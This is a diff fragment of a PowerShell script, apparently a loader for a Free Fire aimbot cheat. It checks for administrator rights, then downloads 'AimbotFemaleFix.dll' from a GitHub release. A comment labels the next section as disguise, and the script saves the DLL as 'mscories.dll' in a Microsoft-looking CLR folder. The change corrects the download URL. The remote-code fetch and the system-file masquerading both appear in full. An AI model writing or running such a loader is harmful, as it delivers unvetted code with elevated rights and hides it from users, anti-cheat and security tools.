@@ -5,7 +5,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 # 2. ตั้งค่าไฟล์และการพรางตัว
-$url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/AimbotFemaleFix.dlll"
+$url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/AimbotFemaleFix.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
